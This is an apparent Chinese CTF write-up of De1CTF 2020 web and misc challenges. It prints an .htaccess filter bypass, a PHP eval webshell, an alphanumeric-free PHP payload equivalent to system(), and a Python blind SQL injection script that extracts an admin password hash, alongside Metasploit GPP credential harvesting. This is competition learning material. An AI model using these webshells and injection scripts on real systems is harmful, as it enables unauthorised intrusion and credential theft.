# De1CTF2020部分writeup

阅读量 **994516**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-05-06 15:30:56

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01cf7afdc4e8ff15a9.png)

## 前言

XCTF分站赛的第一站De1CTF开始了。。。。

这次web题目质量很好 可是太菜了，没做出来多少

## web

###  check in

打开链接发现是一个文件上传的题目

![](https://p5.ssl.qhimg.com/t018ac10ea121fec174.png)

测试发现这里对文件的后缀名有限制，可以修改`Content-Type:`参数进行绕过，但是上传`php`文件不行。。。

对文件内容也有限制。。

    
    
     perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!
    

过滤了一些关键的字符。。  
看到这里猜测考点是利用`.htaccess getshell`

正常的一个`.htaccess`的内容为：

    
    
    SetHandler application/x-httpd-php
    

但是因为文本中有`ph`字符，需要想办法进行绕过，在测试发现：

    
    
    SetHandler application/x-httpd-p
    hp
    

换行进行绕过是可以的。。

![](https://p3.ssl.qhimg.com/dm/1024_542_/t0109024def9bd8ce3d.png)

然后上传图片马，访问即可。。

由于过滤了`ph`,`>`等字符，，所以图片马的内容为：

    
    
    <?=@eval($_POST[aa]);
    

![](https://p5.ssl.qhimg.com/dm/1024_579_/t01aea3f19effc0bfb7.png)

用蚁剑进行链接：

在根目录找到了flag…

![](https://p4.ssl.qhimg.com/t01036392a0e7ebc26f.png)

###  Hard_Pentest_1

打开题目发现给出了源码

    
    
    <?php
    //Clear the uploads directory every hour
    highlight_file(__FILE__);
    $sandbox = "uploads/". md5("De1CTF2020".$_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    
    if($_POST["submit"]){
        if (($_FILES["file"]["size"] < 2048) && Check()){
            if ($_FILES["file"]["error"] > 0){
                die($_FILES["file"]["error"]);
            }
            else{
                $filename=md5($_SERVER['REMOTE_ADDR'])."_".$_FILES["file"]["name"];
                move_uploaded_file($_FILES["file"]["tmp_name"], $filename);
                echo "save in:" . $sandbox."/" . $filename;
            }
        }
        else{
            echo "Not Allow!";
        }
    }
    
    function Check(){
        $BlackExts = array("php");
        $ext = explode(".", $_FILES["file"]["name"]);
        $exts = trim(end($ext));
        $file_content = file_get_contents($_FILES["file"]["tmp_name"]);
    
        if(!preg_match('/[a-z0-9;~^`&|]/is',$file_content)  && 
            !in_array($exts, $BlackExts) && 
            !preg_match('/../',$_FILES["file"]["name"])) {
              return true;
        }
        return false;
    }
    ?>
    
    <html>
    <head>
    <meta charset="utf-8">
    <title>upload</title>
    </head>
    <body>
    
    <form action="index.php" method="post" enctype="multipart/form-data">
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="submit">
    </form>
    
    </body>
    </html>
    

主要看一下这个`check()`

    
    
    function Check(){
        $BlackExts = array("php");
        $ext = explode(".", $_FILES["file"]["name"]);
        $exts = trim(end($ext));
        $file_content = file_get_contents($_FILES["file"]["tmp_name"]);
    
        if(!preg_match('/[a-z0-9;~^`&|]/is',$file_content)  && 
            !in_array($exts, $BlackExts) && 
            !preg_match('/../',$_FILES["file"]["name"])) {
              return true;
        }
        return false;
    }
    

限制了后缀名，不能为`php`，我们可以大小写进行绕过

最重要的是对文件内容进行了过滤。。。

    
    
    preg_match('/[a-z0-9;~^`&|]/is',$file_content)
    

不能出现字母数字和一些特殊字符。。  
想到了无字母数字getshell的点，因为过滤了`~^`,就不能用取反和异或来进行getshell。想到的方法是递增。。。但是递增需要分号，需要绕过分号，来进行getshell…

测试发现可以利用`<?=?>`来进行绕过

    
    
    <?=$_=[]?>
    <?=$_="$_"?>
    <?=$_=$_['!'=='@']?>
    

刚开始传的是`assert`的木马，发现怎么也执行不了命令，忽然看到php版本为`PHP/7.2.29` 那就打扰了

后来改变目标传一个`system`的，发现可以成功。。。

递增的代码 相当于`system($_POST[_]);`：

    
    
    <?=$_=[]?>
    <?=$_="$_"?>
    <?=$_=$_['!'=='@']?>
    <?=$___=$_?>
    <?=$__=$_?>
    <?=$__++?><?=$__++?>
    <?=$__++?><?=$__++?>
    <?=$____=$__++?>
    <?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$_____________=$__++?><?=$__++?>
    <?=$__________=$__++?>
    <?=$_________=$__++?>
    <?=$__++?>
    <?=$________=$__++?>
    <?=$_____=$__++?>
    <?=$______=$__++?>
    <?=$______?>
    <?=$__++?><?=$__++?><?=$__++?><?=$__++?>
    <?=$____________=$__++?>
    <?=$_____.$____________.$_____.$______.$____.$_____________?>
    <?=$________________=$_____.$____________.$_____.$______.$____.$_____________?>
    <?=$_________.$__________.$_____.$______?>
    <?=($________________)(${'_'.$_________.$__________.$_____.$______}[_])?>
    

![](https://p2.ssl.qhimg.com/dm/1024_565_/t012c5f150a93fe695c.png)

可以执行系统命令。。。

上传文件，打到msf上：

![](https://p2.ssl.qhimg.com/t013a2345963763f022.png)

发现了一些信息，存在Hint

![](https://p0.ssl.qhimg.com/t01e3d0a463f75025b1.png)

查看目录文件发现了压缩包 ：

![](https://p0.ssl.qhimg.com/t01f44ddf428e6277f0.png)

将其下载下来，发现需要密码。。

查看了一下用户，发现了一个很奇怪的用户名。。

![](https://p3.ssl.qhimg.com/t0173d435486fa40343.png)

看一下这个用户的信息：

![](https://p2.ssl.qhimg.com/t01410e803f02b4d98b.png)

发现也没有什么有用的信息。。

然后有师傅说会不会`HintZip_Pass`用户的密码就是压缩包的密码。。。

由于对域渗透了解有限。。没有什么好的方法来得到用户密码。。

找到了这样的一篇文章[参考文章]  
利用msf的`gpp`模块 成功获取到了用户的密码：  
(<https://blog.csdn.net/qq_36119192/article/details/104344105>)

![](https://p2.ssl.qhimg.com/t0171cc1b3bb1af9c14.png)

也有提示这就是压缩包的密码`zL1PpP[@sSwO3d](https://github.com/sSwO3d "@sSwO3d")`  
解压得到flag..

![](https://p1.ssl.qhimg.com/t01939876432f16cd7e.png)

###  mixture

打开发现是个登陆页面：

![](https://p4.ssl.qhimg.com/t019db24ec0723af4f7.png)

随便输入就可以进去 很神奇`aa:aa`  
进入之后发现只能够查看用户信息

![](https://p4.ssl.qhimg.com/dm/1024_382_/t01b9ad119269e95ee8.png)

`admin.php`和`select.php`都需要`admin`权限  
查看源码发现有提示`orderby`：

![](https://p1.ssl.qhimg.com/t012d928b22227c88ec.png)

猜测是一个注入。。  
测试发现`http://134.175.185.244/member.php?orderby=|1=2`和`http://134.175.185.244/member.php?orderby=|1=1`回显不同，找到了注入点。。。。  
发现过滤了一些东西：

    
    
    if
    desc
    sleep
    updatexml
    ^
    union
    &&
    regexp
    exp
    extractvalue
    length
    hex
    

可以进行布尔盲注。。  
写个脚本开始跑。。

    
    
    import requests
    import re
    
    
    url="http://134.175.185.244/member.php?orderby="
    cookies={'PHPSESSID':'s0d02a5rb52ejonbml114f8pen'}
    flag=''
    for i in range(1,33):
        print i
        for j in range(37,127):
            # payload="|1=(ascii(mid((database()),"+str(i)+",1))='"+str(j)+"')"
            # payload="|1=(ascii(mid(((SELECT group_concat(table_name) from information_schema.tables where table_schema=database())),"+str(i)+",1))='"+str(j)+"')"
            # payload="|1=(ascii(mid(((SELECT group_concat(column_name) from information_schema.columns where table_name='member')),"+str(i)+",1))='"+str(j)+"')"
            payload="|1=(ascii(mid(((select password from member where username='admin')),"+str(i)+",1))='"+str(j)+"')"
            url_1=url+payload
            res=requests.get(url_1,cookies=cookies)
            a = re.search(r'<td>(.*)</td>', res.text, re.M | re.S).group(1)[:1]
            if int(a)==2:
                flag+=chr(j)
                print flag
                break
            else:
                pass
    # database test
    
    # member,users
    
    # member:  id,username,password
    # password: 18a960a3a0b3554b314ebe77fe545c85
    

得到了密码的md5值，在网站进行解密得到密码。。

![](https://p4.ssl.qhimg.com/dm/1024_430_/t01b4a49e3d9965bd3d.png)

用`admin:goodlucktoyou`进行登陆：

发现select.php可以读源码。。。  
发现存在`/readflag`

![](https://p2.ssl.qhimg.com/dm/1024_490_/t01dbd12c2abfc1c1ea.png)

说明需要执行命令来得到flag…

`admin`页面是一个`phpinfo()`页面。。

发现了一个神奇的东西`Minclude`

![](https://p3.ssl.qhimg.com/dm/1024_95_/t01de6bd4905912226d.png)

`select.php`的内容为：

    
    
    <?php
    include "profile.php";
    $search = $_POST['search'];
    
    if($_SESSION['admin']==1){
        print <<<EOT
    <form class="form" action="select.php" method="post">
        <div class="form-group">
            <label for="disabledTextInput">You can search anything here!!</label></br>
            <input type="text" name="search" id="fromgo" class="form-control">
        </div>
        </div>
        <div class="form-group">
            <input type="submit" name="submit" class="btn btn-info btn-md" value="submit">
        </div>
    </form>
    EOT;
    }
    else{
        print <<<EOT
      <div class="container"> 
          <div class="row"  >            
                  <div class="col-md-10 col-md-offset-4">             
                    <div class="input-group" display：block;margin：0 auto;>                                                       
                                <button class="btn btn-info btn-search " type="button" >You are not admin or not enough money!</button>
                                  </span>
    
                    </div><!-- /input-group -->              
                  </div><!-- /.col-lg-6 --> 
          </div>
      </div>
    EOT;
    }
    if($_SESSION['admin']==1&&!empty($search)){
        //var_dump(urldecode($search));
        Minclude(urldecode($search));
        //lookup($search);
    }
    

这里利用了`Minclude(urldecode($search));` 漏洞点应该就在这里了，，，

然后就是自闭了 没找到解决的方法。。。我太菜了。。。

## Misc

###  Welcome_to_the_2020_de1ctf

是一个加群链接

科学上网得到`flag`

![](https://p5.ssl.qhimg.com/t01c4aca70bb536f2d3.png)

###  Misc杂烩

是一个流量包：

![](https://p1.ssl.qhimg.com/dm/1024_386_/t014e6deb66524b2f91.png)

发现里面有一张png图片，

![](https://p5.ssl.qhimg.com/dm/1024_710_/t015e6af64193e8a982.png)

将其分离出来，找到了一个链接：

<https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view>

下载下来，得到了一个readme.zip  
得到了一个docx文件

![](https://p4.ssl.qhimg.com/dm/1024_556_/t01a0321e1bf52bd0aa.png)

发现没什么东西

分离一下docx文件得到了`You_found_me_Orz.zip`

根据赛题的提示

    
    
    In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are "D" and "E". 压缩包密码暴破考点中，密码的长度为6位，前两位为DE。
    

进行爆破

得到压缩包密码：`DE34Q1`  
得到了一个图片。  
binwalk分离一下： 发现有一个压缩包，里面又文件666.jpg:fffffffflllll.txt 为flag

![](https://p2.ssl.qhimg.com/t01ba69435a763ff23b.png)

De1CTF{E4Sy_M1sc_By_Jaivy_31b229908cb9bb}

###  Questionnaire

问卷调查，直接给`flag`

![](https://p3.ssl.qhimg.com/t01f0e7cd7b59a2edfa.png)

## 总结

这次比赛质量真的好，题目很好，也很新颖，接触了一些域渗透的东西，，  
感觉有不错的收获。。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **p1ump** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/204345](/post/id/204345)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __2赞

 __收藏

![](https://p2.ssl.qhimg.com/t01bf320cf8ea4eab09.png) p1ump

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

